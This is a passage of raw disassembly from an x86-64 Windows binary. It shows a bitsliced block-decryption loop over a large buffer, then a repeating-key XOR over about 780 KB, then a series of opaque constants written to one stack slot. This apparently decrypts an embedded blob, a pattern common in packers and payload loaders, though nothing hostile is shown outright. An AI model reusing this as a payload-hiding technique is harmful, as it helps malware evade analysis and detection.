   140004510:	48 89 f8             	mov    %rdi,%rax
   140004513:	48 c1 e8 08          	shr    $0x8,%rax
   140004517:	48 31 f8             	xor    %rdi,%rax
   14000451a:	4c 21 d0             	and    %r10,%rax
   14000451d:	48 89 c1             	mov    %rax,%rcx
   140004520:	48 c1 e1 08          	shl    $0x8,%rcx
   140004524:	48 09 c1             	or     %rax,%rcx
   140004527:	48 31 f9             	xor    %rdi,%rcx
   14000452a:	48 89 8d 80 08 00 00 	mov    %rcx,0x880(%rbp)
   140004531:	48 89 f0             	mov    %rsi,%rax
   140004534:	48 c1 e8 08          	shr    $0x8,%rax
   140004538:	48 31 f0             	xor    %rsi,%rax
   14000453b:	4c 21 d0             	and    %r10,%rax
   14000453e:	48 89 c1             	mov    %rax,%rcx
   140004541:	48 c1 e1 08          	shl    $0x8,%rcx
   140004545:	48 09 c1             	or     %rax,%rcx
   140004548:	48 31 f1             	xor    %rsi,%rcx
   14000454b:	4c 8b ad b8 0c 00 00 	mov    0xcb8(%rbp),%r13
   140004552:	49 c1 e5 06          	shl    $0x6,%r13
   140004556:	48 89 8d 88 08 00 00 	mov    %rcx,0x888(%rbp)
   14000455d:	48 8b 85 18 0d 00 00 	mov    0xd18(%rbp),%rax
   140004564:	4c 01 e8             	add    %r13,%rax
   140004567:	48 89 85 c0 0d 00 00 	mov    %rax,0xdc0(%rbp)
   14000456e:	48 8d 8d 50 08 00 00 	lea    0x850(%rbp),%rcx
   140004575:	e8 76 50 00 00       	call   0x1400095f0
   14000457a:	4c 8b 85 50 08 00 00 	mov    0x850(%rbp),%r8
   140004581:	4c 33 85 50 03 00 00 	xor    0x350(%rbp),%r8
   140004588:	4c 8b 95 58 08 00 00 	mov    0x858(%rbp),%r10
   14000458f:	4c 89 85 50 08 00 00 	mov    %r8,0x850(%rbp)
   140004596:	4c 33 95 58 03 00 00 	xor    0x358(%rbp),%r10
   14000459d:	4c 89 95 58 08 00 00 	mov    %r10,0x858(%rbp)
   1400045a4:	48 8b b5 60 08 00 00 	mov    0x860(%rbp),%rsi
   1400045ab:	48 33 b5 60 03 00 00 	xor    0x360(%rbp),%rsi
   1400045b2:	48 89 b5 60 08 00 00 	mov    %rsi,0x860(%rbp)
   1400045b9:	4c 8b 9d 68 08 00 00 	mov    0x868(%rbp),%r11
   1400045c0:	4c 33 9d 68 03 00 00 	xor    0x368(%rbp),%r11
   1400045c7:	4c 89 9d 68 08 00 00 	mov    %r11,0x868(%rbp)
   1400045ce:	48 8b 95 70 08 00 00 	mov    0x870(%rbp),%rdx
   1400045d5:	48 33 95 70 03 00 00 	xor    0x370(%rbp),%rdx
   1400045dc:	48 89 95 70 08 00 00 	mov    %rdx,0x870(%rbp)
   1400045e3:	4c 8b a5 78 08 00 00 	mov    0x878(%rbp),%r12
   1400045ea:	4c 33 a5 78 03 00 00 	xor    0x378(%rbp),%r12
   1400045f1:	4c 89 a5 78 08 00 00 	mov    %r12,0x878(%rbp)
   1400045f8:	48 8b bd 80 08 00 00 	mov    0x880(%rbp),%rdi
   1400045ff:	48 33 bd 80 03 00 00 	xor    0x380(%rbp),%rdi
   140004606:	48 8b 85 88 08 00 00 	mov    0x888(%rbp),%rax
   14000460d:	48 33 85 88 03 00 00 	xor    0x388(%rbp),%rax
   140004614:	4c 89 c1             	mov    %r8,%rcx
   140004617:	48 d1 e9             	shr    $1,%rcx
   14000461a:	4c 31 d1             	xor    %r10,%rcx
   14000461d:	48 bb 55 55 55 55 55 	movabs $0x5555555555555555,%rbx
   140004624:	55 55 55 
   140004627:	48 21 d9             	and    %rbx,%rcx
   14000462a:	49 31 ca             	xor    %rcx,%r10
   14000462d:	48 01 c9             	add    %rcx,%rcx
   140004630:	4c 31 c1             	xor    %r8,%rcx
   140004633:	49 89 f0             	mov    %rsi,%r8
   140004636:	49 d1 e8             	shr    $1,%r8
   140004639:	4d 31 d8             	xor    %r11,%r8
   14000463c:	49 21 d8             	and    %rbx,%r8
   14000463f:	4d 31 c3             	xor    %r8,%r11
   140004642:	4d 01 c0             	add    %r8,%r8
   140004645:	49 31 f0             	xor    %rsi,%r8
   140004648:	48 89 d6             	mov    %rdx,%rsi
   14000464b:	48 d1 ee             	shr    $1,%rsi
   14000464e:	4c 31 e6             	xor    %r12,%rsi
   140004651:	48 21 de             	and    %rbx,%rsi
   140004654:	49 31 f4             	xor    %rsi,%r12
   140004657:	48 01 f6             	add    %rsi,%rsi
   14000465a:	48 31 d6             	xor    %rdx,%rsi
   14000465d:	48 89 fa             	mov    %rdi,%rdx
   140004660:	48 d1 ea             	shr    $1,%rdx
   140004663:	48 31 c2             	xor    %rax,%rdx
   140004666:	48 21 da             	and    %rbx,%rdx
   140004669:	48 31 d0             	xor    %rdx,%rax
   14000466c:	48 01 d2             	add    %rdx,%rdx
   14000466f:	48 31 fa             	xor    %rdi,%rdx
   140004672:	48 89 cf             	mov    %rcx,%rdi
   140004675:	48 c1 ef 02          	shr    $0x2,%rdi
   140004679:	4c 31 c7             	xor    %r8,%rdi
   14000467c:	49 b9 33 33 33 33 33 	movabs $0x3333333333333333,%r9
   140004683:	33 33 33 
   140004686:	4c 21 cf             	and    %r9,%rdi
   140004689:	49 31 f8             	xor    %rdi,%r8
   14000468c:	48 c1 e7 02          	shl    $0x2,%rdi
   140004690:	48 31 cf             	xor    %rcx,%rdi
   140004693:	48 89 f1             	mov    %rsi,%rcx
   140004696:	48 c1 e9 02          	shr    $0x2,%rcx
   14000469a:	48 31 d1             	xor    %rdx,%rcx
   14000469d:	4c 21 c9             	and    %r9,%rcx
   1400046a0:	48 31 ca             	xor    %rcx,%rdx
   1400046a3:	48 c1 e1 02          	shl    $0x2,%rcx
   1400046a7:	48 31 f1             	xor    %rsi,%rcx
   1400046aa:	48 89 fb             	mov    %rdi,%rbx
   1400046ad:	48 c1 eb 04          	shr    $0x4,%rbx
   1400046b1:	48 31 cb             	xor    %rcx,%rbx
   1400046b4:	48 be 0f 0f 0f 0f 0f 	movabs $0xf0f0f0f0f0f0f0f,%rsi
   1400046bb:	0f 0f 0f 
   1400046be:	48 21 f3             	and    %rsi,%rbx
   1400046c1:	48 31 d9             	xor    %rbx,%rcx
   1400046c4:	48 c1 e3 04          	shl    $0x4,%rbx
   1400046c8:	48 31 fb             	xor    %rdi,%rbx
   1400046cb:	89 de                	mov    %ebx,%esi
   1400046cd:	c1 ee 10             	shr    $0x10,%esi
   1400046d0:	48 89 df             	mov    %rbx,%rdi
   1400046d3:	48 c1 ef 20          	shr    $0x20,%rdi
   1400046d7:	49 89 de             	mov    %rbx,%r14
   1400046da:	49 c1 ee 30          	shr    $0x30,%r14
   1400046de:	88 9d 70 0d 00 00    	mov    %bl,0xd70(%rbp)
   1400046e4:	40 88 b5 71 0d 00 00 	mov    %sil,0xd71(%rbp)
   1400046eb:	49 89 df             	mov    %rbx,%r15
   1400046ee:	40 88 bd 72 0d 00 00 	mov    %dil,0xd72(%rbp)
   1400046f5:	48 89 df             	mov    %rbx,%rdi
   1400046f8:	44 88 b5 73 0d 00 00 	mov    %r14b,0xd73(%rbp)
   1400046ff:	89 ce                	mov    %ecx,%esi
   140004701:	c1 ee 10             	shr    $0x10,%esi
   140004704:	88 8d 74 0d 00 00    	mov    %cl,0xd74(%rbp)
   14000470a:	40 88 b5 75 0d 00 00 	mov    %sil,0xd75(%rbp)
   140004711:	48 89 ce             	mov    %rcx,%rsi
   140004714:	48 c1 ee 20          	shr    $0x20,%rsi
   140004718:	40 88 b5 76 0d 00 00 	mov    %sil,0xd76(%rbp)
   14000471f:	48 89 ce             	mov    %rcx,%rsi
   140004722:	48 c1 ee 30          	shr    $0x30,%rsi
   140004726:	40 88 b5 77 0d 00 00 	mov    %sil,0xd77(%rbp)
   14000472d:	88 bd 78 0d 00 00    	mov    %bh,0xd78(%rbp)
   140004733:	4c 89 d6             	mov    %r10,%rsi
   140004736:	48 c1 ee 02          	shr    $0x2,%rsi
   14000473a:	4c 31 de             	xor    %r11,%rsi
   14000473d:	4c 21 ce             	and    %r9,%rsi
   140004740:	49 31 f3             	xor    %rsi,%r11
   140004743:	48 c1 e6 02          	shl    $0x2,%rsi
   140004747:	4c 31 d6             	xor    %r10,%rsi
   14000474a:	c1 eb 18             	shr    $0x18,%ebx
   14000474d:	49 c1 ef 28          	shr    $0x28,%r15
   140004751:	48 c1 ef 38          	shr    $0x38,%rdi
   140004755:	88 9d 79 0d 00 00    	mov    %bl,0xd79(%rbp)
   14000475b:	49 89 ca             	mov    %rcx,%r10
   14000475e:	44 88 bd 7a 0d 00 00 	mov    %r15b,0xd7a(%rbp)
   140004765:	49 89 ce             	mov    %rcx,%r14
   140004768:	40 88 bd 7b 0d 00 00 	mov    %dil,0xd7b(%rbp)
   14000476f:	88 ad 7c 0d 00 00    	mov    %ch,0xd7c(%rbp)
   140004775:	89 cf                	mov    %ecx,%edi
   140004777:	4c 89 e1             	mov    %r12,%rcx
   14000477a:	48 c1 e9 02          	shr    $0x2,%rcx
   14000477e:	48 31 c1             	xor    %rax,%rcx
   140004781:	4c 21 c9             	and    %r9,%rcx
   140004784:	48 31 c8             	xor    %rcx,%rax
   140004787:	48 c1 e1 02          	shl    $0x2,%rcx
   14000478b:	4c 31 e1             	xor    %r12,%rcx
   14000478e:	48 89 f3             	mov    %rsi,%rbx
   140004791:	48 c1 eb 04          	shr    $0x4,%rbx
   140004795:	48 31 cb             	xor    %rcx,%rbx
   140004798:	49 bf 0f 0f 0f 0f 0f 	movabs $0xf0f0f0f0f0f0f0f,%r15
   14000479f:	0f 0f 0f 
   1400047a2:	4c 21 fb             	and    %r15,%rbx
   1400047a5:	48 31 d9             	xor    %rbx,%rcx
   1400047a8:	48 c1 e3 04          	shl    $0x4,%rbx
   1400047ac:	48 31 f3             	xor    %rsi,%rbx
   1400047af:	c1 ef 18             	shr    $0x18,%edi
   1400047b2:	40 88 bd 7d 0d 00 00 	mov    %dil,0xd7d(%rbp)
   1400047b9:	49 c1 ea 28          	shr    $0x28,%r10
   1400047bd:	49 c1 ee 38          	shr    $0x38,%r14
   1400047c1:	44 88 95 7e 0d 00 00 	mov    %r10b,0xd7e(%rbp)
   1400047c8:	41 89 d9             	mov    %ebx,%r9d
   1400047cb:	41 c1 e9 10          	shr    $0x10,%r9d
   1400047cf:	44 88 b5 7f 0d 00 00 	mov    %r14b,0xd7f(%rbp)
   1400047d6:	49 89 da             	mov    %rbx,%r10
   1400047d9:	49 c1 ea 20          	shr    $0x20,%r10
   1400047dd:	88 9d 80 0d 00 00    	mov    %bl,0xd80(%rbp)
   1400047e3:	44 88 8d 81 0d 00 00 	mov    %r9b,0xd81(%rbp)
   1400047ea:	49 89 d9             	mov    %rbx,%r9
   1400047ed:	49 c1 e9 30          	shr    $0x30,%r9
   1400047f1:	44 88 95 82 0d 00 00 	mov    %r10b,0xd82(%rbp)
   1400047f8:	49 89 da             	mov    %rbx,%r10
   1400047fb:	44 88 8d 83 0d 00 00 	mov    %r9b,0xd83(%rbp)
   140004802:	41 89 c9             	mov    %ecx,%r9d
   140004805:	41 c1 e9 10          	shr    $0x10,%r9d
   140004809:	88 8d 84 0d 00 00    	mov    %cl,0xd84(%rbp)
   14000480f:	44 88 8d 85 0d 00 00 	mov    %r9b,0xd85(%rbp)
   140004816:	49 89 c9             	mov    %rcx,%r9
   140004819:	49 c1 e9 20          	shr    $0x20,%r9
   14000481d:	44 88 8d 86 0d 00 00 	mov    %r9b,0xd86(%rbp)
   140004824:	49 89 c9             	mov    %rcx,%r9
   140004827:	49 c1 e9 30          	shr    $0x30,%r9
   14000482b:	44 88 8d 87 0d 00 00 	mov    %r9b,0xd87(%rbp)
   140004832:	49 89 d9             	mov    %rbx,%r9
   140004835:	88 bd 88 0d 00 00    	mov    %bh,0xd88(%rbp)
   14000483b:	89 de                	mov    %ebx,%esi
   14000483d:	c1 ee 18             	shr    $0x18,%esi
   140004840:	49 c1 ea 28          	shr    $0x28,%r10
   140004844:	49 c1 e9 38          	shr    $0x38,%r9
   140004848:	40 88 b5 89 0d 00 00 	mov    %sil,0xd89(%rbp)
   14000484f:	48 89 ce             	mov    %rcx,%rsi
   140004852:	44 88 95 8a 0d 00 00 	mov    %r10b,0xd8a(%rbp)
   140004859:	49 89 ca             	mov    %rcx,%r10
   14000485c:	44 88 8d 8b 0d 00 00 	mov    %r9b,0xd8b(%rbp)
   140004863:	88 ad 8c 0d 00 00    	mov    %ch,0xd8c(%rbp)
   140004869:	41 89 c9             	mov    %ecx,%r9d
   14000486c:	4c 89 c1             	mov    %r8,%rcx
   14000486f:	48 c1 e9 04          	shr    $0x4,%rcx
   140004873:	48 31 d1             	xor    %rdx,%rcx
   140004876:	4c 21 f9             	and    %r15,%rcx
   140004879:	48 31 ca             	xor    %rcx,%rdx
   14000487c:	48 c1 e1 04          	shl    $0x4,%rcx
   140004880:	4c 31 c1             	xor    %r8,%rcx
   140004883:	41 c1 e9 18          	shr    $0x18,%r9d
   140004887:	44 88 8d 8d 0d 00 00 	mov    %r9b,0xd8d(%rbp)
   14000488e:	48 c1 ee 28          	shr    $0x28,%rsi
   140004892:	49 c1 ea 38          	shr    $0x38,%r10
   140004896:	40 88 b5 8e 0d 00 00 	mov    %sil,0xd8e(%rbp)
   14000489d:	41 89 c8             	mov    %ecx,%r8d
   1400048a0:	41 c1 e8 10          	shr    $0x10,%r8d
   1400048a4:	44 88 95 8f 0d 00 00 	mov    %r10b,0xd8f(%rbp)
   1400048ab:	49 89 c9             	mov    %rcx,%r9
   1400048ae:	49 c1 e9 20          	shr    $0x20,%r9
   1400048b2:	88 8d 90 0d 00 00    	mov    %cl,0xd90(%rbp)
   1400048b8:	44 88 85 91 0d 00 00 	mov    %r8b,0xd91(%rbp)
   1400048bf:	49 89 c8             	mov    %rcx,%r8
   1400048c2:	49 c1 e8 30          	shr    $0x30,%r8
   1400048c6:	44 88 8d 92 0d 00 00 	mov    %r9b,0xd92(%rbp)
   1400048cd:	49 89 c9             	mov    %rcx,%r9
   1400048d0:	44 88 85 93 0d 00 00 	mov    %r8b,0xd93(%rbp)
   1400048d7:	41 89 d0             	mov    %edx,%r8d
   1400048da:	41 c1 e8 10          	shr    $0x10,%r8d
   1400048de:	88 95 94 0d 00 00    	mov    %dl,0xd94(%rbp)
   1400048e4:	44 88 85 95 0d 00 00 	mov    %r8b,0xd95(%rbp)
   1400048eb:	49 89 d0             	mov    %rdx,%r8
   1400048ee:	49 c1 e8 20          	shr    $0x20,%r8
   1400048f2:	44 88 85 96 0d 00 00 	mov    %r8b,0xd96(%rbp)
   1400048f9:	49 89 d0             	mov    %rdx,%r8
   1400048fc:	49 c1 e8 30          	shr    $0x30,%r8
   140004900:	44 88 85 97 0d 00 00 	mov    %r8b,0xd97(%rbp)
   140004907:	49 89 c8             	mov    %rcx,%r8
   14000490a:	88 ad 98 0d 00 00    	mov    %ch,0xd98(%rbp)
   140004910:	c1 e9 18             	shr    $0x18,%ecx
   140004913:	49 c1 e9 28          	shr    $0x28,%r9
   140004917:	49 c1 e8 38          	shr    $0x38,%r8
   14000491b:	88 8d 99 0d 00 00    	mov    %cl,0xd99(%rbp)
   140004921:	49 89 d2             	mov    %rdx,%r10
   140004924:	44 88 8d 9a 0d 00 00 	mov    %r9b,0xd9a(%rbp)
   14000492b:	49 89 d1             	mov    %rdx,%r9
   14000492e:	44 88 85 9b 0d 00 00 	mov    %r8b,0xd9b(%rbp)
   140004935:	88 b5 9c 0d 00 00    	mov    %dh,0xd9c(%rbp)
   14000493b:	4c 89 d9             	mov    %r11,%rcx
   14000493e:	48 c1 e9 04          	shr    $0x4,%rcx
   140004942:	48 31 c1             	xor    %rax,%rcx
   140004945:	4c 21 f9             	and    %r15,%rcx
   140004948:	48 31 c8             	xor    %rcx,%rax
   14000494b:	48 c1 e1 04          	shl    $0x4,%rcx
   14000494f:	4c 31 d9             	xor    %r11,%rcx
   140004952:	c1 ea 18             	shr    $0x18,%edx
   140004955:	88 95 9d 0d 00 00    	mov    %dl,0xd9d(%rbp)
   14000495b:	49 c1 ea 28          	shr    $0x28,%r10
   14000495f:	49 c1 e9 38          	shr    $0x38,%r9
   140004963:	44 88 95 9e 0d 00 00 	mov    %r10b,0xd9e(%rbp)
   14000496a:	89 ca                	mov    %ecx,%edx
   14000496c:	c1 ea 10             	shr    $0x10,%edx
   14000496f:	44 88 8d 9f 0d 00 00 	mov    %r9b,0xd9f(%rbp)
   140004976:	49 89 c8             	mov    %rcx,%r8
   140004979:	49 c1 e8 20          	shr    $0x20,%r8
   14000497d:	88 8d a0 0d 00 00    	mov    %cl,0xda0(%rbp)
   140004983:	88 95 a1 0d 00 00    	mov    %dl,0xda1(%rbp)
   140004989:	48 89 ca             	mov    %rcx,%rdx
   14000498c:	48 c1 ea 30          	shr    $0x30,%rdx
   140004990:	44 88 85 a2 0d 00 00 	mov    %r8b,0xda2(%rbp)
   140004997:	49 89 c8             	mov    %rcx,%r8
   14000499a:	88 95 a3 0d 00 00    	mov    %dl,0xda3(%rbp)
   1400049a0:	89 c2                	mov    %eax,%edx
   1400049a2:	c1 ea 10             	shr    $0x10,%edx
   1400049a5:	88 85 a4 0d 00 00    	mov    %al,0xda4(%rbp)
   1400049ab:	88 95 a5 0d 00 00    	mov    %dl,0xda5(%rbp)
   1400049b1:	48 89 c2             	mov    %rax,%rdx
   1400049b4:	48 c1 ea 20          	shr    $0x20,%rdx
   1400049b8:	88 95 a6 0d 00 00    	mov    %dl,0xda6(%rbp)
   1400049be:	48 89 c2             	mov    %rax,%rdx
   1400049c1:	48 c1 ea 30          	shr    $0x30,%rdx
   1400049c5:	88 95 a7 0d 00 00    	mov    %dl,0xda7(%rbp)
   1400049cb:	48 89 ca             	mov    %rcx,%rdx
   1400049ce:	88 ad a8 0d 00 00    	mov    %ch,0xda8(%rbp)
   1400049d4:	c1 e9 18             	shr    $0x18,%ecx
   1400049d7:	88 8d a9 0d 00 00    	mov    %cl,0xda9(%rbp)
   1400049dd:	49 c1 e8 28          	shr    $0x28,%r8
   1400049e1:	48 c1 ea 38          	shr    $0x38,%rdx
   1400049e5:	44 88 85 aa 0d 00 00 	mov    %r8b,0xdaa(%rbp)
   1400049ec:	48 89 c1             	mov    %rax,%rcx
   1400049ef:	88 95 ab 0d 00 00    	mov    %dl,0xdab(%rbp)
   1400049f5:	48 89 c2             	mov    %rax,%rdx
   1400049f8:	88 a5 ac 0d 00 00    	mov    %ah,0xdac(%rbp)
   1400049fe:	c1 e8 18             	shr    $0x18,%eax
   140004a01:	88 85 ad 0d 00 00    	mov    %al,0xdad(%rbp)
   140004a07:	48 c1 e9 28          	shr    $0x28,%rcx
   140004a0b:	88 8d ae 0d 00 00    	mov    %cl,0xdae(%rbp)
   140004a11:	48 c1 ea 38          	shr    $0x38,%rdx
   140004a15:	88 95 af 0d 00 00    	mov    %dl,0xdaf(%rbp)
   140004a1b:	4c 8b b5 18 0d 00 00 	mov    0xd18(%rbp),%r14
   140004a22:	43 0f 10 04 2e       	movups (%r14,%r13,1),%xmm0
   140004a27:	f3 43 0f 6f 4c 2e 10 	movdqu 0x10(%r14,%r13,1),%xmm1
   140004a2e:	f3 43 0f 6f 54 2e 20 	movdqu 0x20(%r14,%r13,1),%xmm2
   140004a35:	f3 43 0f 6f 5c 2e 30 	movdqu 0x30(%r14,%r13,1),%xmm3
   140004a3c:	66 0f 7f 9d 80 08 00 	movdqa %xmm3,0x880(%rbp)
   140004a43:	00 
   140004a44:	66 0f 7f 95 70 08 00 	movdqa %xmm2,0x870(%rbp)
   140004a4b:	00 
   140004a4c:	66 0f 7f 8d 60 08 00 	movdqa %xmm1,0x860(%rbp)
   140004a53:	00 
   140004a54:	0f 29 85 50 08 00 00 	movaps %xmm0,0x850(%rbp)
   140004a5b:	66 0f 7f b5 60 0d 00 	movdqa %xmm6,0xd60(%rbp)
   140004a62:	00 
   140004a63:	66 0f 7f b5 50 0d 00 	movdqa %xmm6,0xd50(%rbp)
   140004a6a:	00 
   140004a6b:	66 0f 7f b5 40 0d 00 	movdqa %xmm6,0xd40(%rbp)
   140004a72:	00 
   140004a73:	66 0f 7f b5 30 0d 00 	movdqa %xmm6,0xd30(%rbp)
   140004a7a:	00 
   140004a7b:	b8 0f 00 00 00       	mov    $0xf,%eax
   140004a80:	48 8b 9d c0 0c 00 00 	mov    0xcc0(%rbp),%rbx
   140004a87:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140004a8e:	00 00 
   140004a90:	0f b6 8c 05 61 0d 00 	movzbl 0xd61(%rbp,%rax,1),%ecx
   140004a97:	00 
   140004a98:	0f b6 94 05 62 0d 00 	movzbl 0xd62(%rbp,%rax,1),%edx
   140004a9f:	00 
   140004aa0:	32 8c 05 41 08 00 00 	xor    0x841(%rbp,%rax,1),%cl
   140004aa7:	32 94 05 42 08 00 00 	xor    0x842(%rbp,%rax,1),%dl
   140004aae:	88 8c 05 21 0d 00 00 	mov    %cl,0xd21(%rbp,%rax,1)
   140004ab5:	0f b6 8c 05 63 0d 00 	movzbl 0xd63(%rbp,%rax,1),%ecx
   140004abc:	00 
   140004abd:	32 8c 05 43 08 00 00 	xor    0x843(%rbp,%rax,1),%cl
   140004ac4:	88 94 05 22 0d 00 00 	mov    %dl,0xd22(%rbp,%rax,1)
   140004acb:	0f b6 94 05 64 0d 00 	movzbl 0xd64(%rbp,%rax,1),%edx
   140004ad2:	00 
   140004ad3:	32 94 05 44 08 00 00 	xor    0x844(%rbp,%rax,1),%dl
   140004ada:	88 8c 05 23 0d 00 00 	mov    %cl,0xd23(%rbp,%rax,1)
   140004ae1:	0f b6 8c 05 65 0d 00 	movzbl 0xd65(%rbp,%rax,1),%ecx
   140004ae8:	00 
   140004ae9:	32 8c 05 45 08 00 00 	xor    0x845(%rbp,%rax,1),%cl
   140004af0:	88 94 05 24 0d 00 00 	mov    %dl,0xd24(%rbp,%rax,1)
   140004af7:	0f b6 94 05 66 0d 00 	movzbl 0xd66(%rbp,%rax,1),%edx
   140004afe:	00 
   140004aff:	32 94 05 46 08 00 00 	xor    0x846(%rbp,%rax,1),%dl
   140004b06:	88 8c 05 25 0d 00 00 	mov    %cl,0xd25(%rbp,%rax,1)
   140004b0d:	88 94 05 26 0d 00 00 	mov    %dl,0xd26(%rbp,%rax,1)
   140004b14:	0f b6 8c 05 67 0d 00 	movzbl 0xd67(%rbp,%rax,1),%ecx
   140004b1b:	00 
   140004b1c:	0f b6 94 05 68 0d 00 	movzbl 0xd68(%rbp,%rax,1),%edx
   140004b23:	00 
   140004b24:	32 8c 05 47 08 00 00 	xor    0x847(%rbp,%rax,1),%cl
   140004b2b:	32 94 05 48 08 00 00 	xor    0x848(%rbp,%rax,1),%dl
   140004b32:	88 8c 05 27 0d 00 00 	mov    %cl,0xd27(%rbp,%rax,1)
   140004b39:	0f b6 8c 05 69 0d 00 	movzbl 0xd69(%rbp,%rax,1),%ecx
   140004b40:	00 
   140004b41:	32 8c 05 49 08 00 00 	xor    0x849(%rbp,%rax,1),%cl
   140004b48:	88 94 05 28 0d 00 00 	mov    %dl,0xd28(%rbp,%rax,1)
   140004b4f:	0f b6 94 05 6a 0d 00 	movzbl 0xd6a(%rbp,%rax,1),%edx
   140004b56:	00 
   140004b57:	32 94 05 4a 08 00 00 	xor    0x84a(%rbp,%rax,1),%dl
   140004b5e:	88 8c 05 29 0d 00 00 	mov    %cl,0xd29(%rbp,%rax,1)
   140004b65:	0f b6 8c 05 6b 0d 00 	movzbl 0xd6b(%rbp,%rax,1),%ecx
   140004b6c:	00 
   140004b6d:	32 8c 05 4b 08 00 00 	xor    0x84b(%rbp,%rax,1),%cl
   140004b74:	88 94 05 2a 0d 00 00 	mov    %dl,0xd2a(%rbp,%rax,1)
   140004b7b:	0f b6 94 05 6c 0d 00 	movzbl 0xd6c(%rbp,%rax,1),%edx
   140004b82:	00 
   140004b83:	32 94 05 4c 08 00 00 	xor    0x84c(%rbp,%rax,1),%dl
   140004b8a:	88 8c 05 2b 0d 00 00 	mov    %cl,0xd2b(%rbp,%rax,1)
   140004b91:	88 94 05 2c 0d 00 00 	mov    %dl,0xd2c(%rbp,%rax,1)
   140004b98:	0f b6 8c 05 6d 0d 00 	movzbl 0xd6d(%rbp,%rax,1),%ecx
   140004b9f:	00 
   140004ba0:	0f b6 94 05 6e 0d 00 	movzbl 0xd6e(%rbp,%rax,1),%edx
   140004ba7:	00 
   140004ba8:	32 8c 05 4d 08 00 00 	xor    0x84d(%rbp,%rax,1),%cl
   140004baf:	32 94 05 4e 08 00 00 	xor    0x84e(%rbp,%rax,1),%dl
   140004bb6:	88 8c 05 2d 0d 00 00 	mov    %cl,0xd2d(%rbp,%rax,1)
   140004bbd:	0f b6 8c 05 6f 0d 00 	movzbl 0xd6f(%rbp,%rax,1),%ecx
   140004bc4:	00 
   140004bc5:	32 8c 05 4f 08 00 00 	xor    0x84f(%rbp,%rax,1),%cl
   140004bcc:	88 94 05 2e 0d 00 00 	mov    %dl,0xd2e(%rbp,%rax,1)
   140004bd3:	0f b6 94 05 70 0d 00 	movzbl 0xd70(%rbp,%rax,1),%edx
   140004bda:	00 
   140004bdb:	32 94 05 50 08 00 00 	xor    0x850(%rbp,%rax,1),%dl
   140004be2:	88 8c 05 2f 0d 00 00 	mov    %cl,0xd2f(%rbp,%rax,1)
   140004be9:	88 94 05 30 0d 00 00 	mov    %dl,0xd30(%rbp,%rax,1)
   140004bf0:	48 83 c0 10          	add    $0x10,%rax
   140004bf4:	48 83 f8 4f          	cmp    $0x4f,%rax
   140004bf8:	0f 85 92 fe ff ff    	jne    0x140004a90
   140004bfe:	48 8b 8d b8 0c 00 00 	mov    0xcb8(%rbp),%rcx
   140004c05:	48 ff c1             	inc    %rcx
   140004c08:	0f 28 85 30 0d 00 00 	movaps 0xd30(%rbp),%xmm0
   140004c0f:	66 0f 6f 8d 40 0d 00 	movdqa 0xd40(%rbp),%xmm1
   140004c16:	00 
   140004c17:	66 0f 6f 95 50 0d 00 	movdqa 0xd50(%rbp),%xmm2
   140004c1e:	00 
   140004c1f:	66 0f 6f 9d 60 0d 00 	movdqa 0xd60(%rbp),%xmm3
   140004c26:	00 
   140004c27:	48 8b 85 c0 0d 00 00 	mov    0xdc0(%rbp),%rax
   140004c2e:	f3 0f 7f 58 30       	movdqu %xmm3,0x30(%rax)
   140004c33:	f3 0f 7f 50 20       	movdqu %xmm2,0x20(%rax)
   140004c38:	f3 0f 7f 48 10       	movdqu %xmm1,0x10(%rax)
   140004c3d:	0f 11 00             	movups %xmm0,(%rax)
   140004c40:	48 89 8d b8 0c 00 00 	mov    %rcx,0xcb8(%rbp)
   140004c47:	48 81 f9 98 2f 00 00 	cmp    $0x2f98,%rcx
   140004c4e:	49 bc 00 f0 00 f0 00 	movabs $0xf000f000f000f000,%r12
   140004c55:	f0 00 f0 
   140004c58:	48 8d b5 50 08 00 00 	lea    0x850(%rbp),%rsi
   140004c5f:	0f 85 6b eb ff ff    	jne    0x1400037d0
   140004c65:	c6 85 c0 03 00 00 00 	movb   $0x0,0x3c0(%rbp)
   140004c6c:	48 8b b5 f8 07 00 00 	mov    0x7f8(%rbp),%rsi
   140004c73:	4c 8d 4e 01          	lea    0x1(%rsi),%r9
   140004c77:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004c7c:	45 31 c0             	xor    %r8d,%r8d
   140004c7f:	49 ba 0d ce c7 e0 7c 	movabs $0xc7ce0c7ce0c7ce0d,%r10
   140004c86:	0c ce c7 
   140004c89:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004c90:	48 89 c8             	mov    %rcx,%rax
   140004c93:	49 f7 e2             	mul    %r10
   140004c96:	48 c1 ea 05          	shr    $0x5,%rdx
   140004c9a:	4c 6b da d7          	imul   $0xffffffffffffffd7,%rdx,%r11
   140004c9e:	4d 01 cb             	add    %r9,%r11
   140004ca1:	4c 89 c0             	mov    %r8,%rax
   140004ca4:	49 f7 e2             	mul    %r10
   140004ca7:	48 c1 ea 05          	shr    $0x5,%rdx
   140004cab:	48 6b c2 d7          	imul   $0xffffffffffffffd7,%rdx,%rax
   140004caf:	48 01 f0             	add    %rsi,%rax
   140004cb2:	41 0f b6 04 00       	movzbl (%r8,%rax,1),%eax
   140004cb7:	43 30 04 06          	xor    %al,(%r14,%r8,1)
   140004cbb:	43 0f b6 04 18       	movzbl (%r8,%r11,1),%eax
   140004cc0:	43 30 44 06 01       	xor    %al,0x1(%r14,%r8,1)
   140004cc5:	49 83 c0 02          	add    $0x2,%r8
   140004cc9:	48 83 c1 02          	add    $0x2,%rcx
   140004ccd:	49 81 f8 00 e6 0b 00 	cmp    $0xbe600,%r8
   140004cd4:	75 ba                	jne    0x140004c90
   140004cd6:	48 b8 61 4a 87 e9 e8 	movabs $0xda570be8e9874a61,%rax
   140004cdd:	0b 57 da 
   140004ce0:	48 89 85 50 08 00 00 	mov    %rax,0x850(%rbp)
   140004ce7:	48 8d 85 50 08 00 00 	lea    0x850(%rbp),%rax
   140004cee:	48 b8 9b 08 2b 30 23 	movabs $0x84880c23302b089b,%rax
   140004cf5:	0c 88 84 
   140004cf8:	48 89 85 50 08 00 00 	mov    %rax,0x850(%rbp)
   140004cff:	48 8d 85 50 08 00 00 	lea    0x850(%rbp),%rax
   140004d06:	48 b8 98 5a e2 61 54 	movabs $0xcddec65461e25a98,%rax
   140004d0d:	c6 de cd 
   140004d10:	48 89 85 50 08 00 00 	mov    %rax,0x850(%rbp)
   140004d17:	48 8d 85 50 08 00 00 	lea    0x850(%rbp),%rax
   140004d1e:	48 b8 9f 96 f0 de 0d 	movabs $0x38d2ac0ddef0969f,%rax
   140004d25:	ac d2 38 
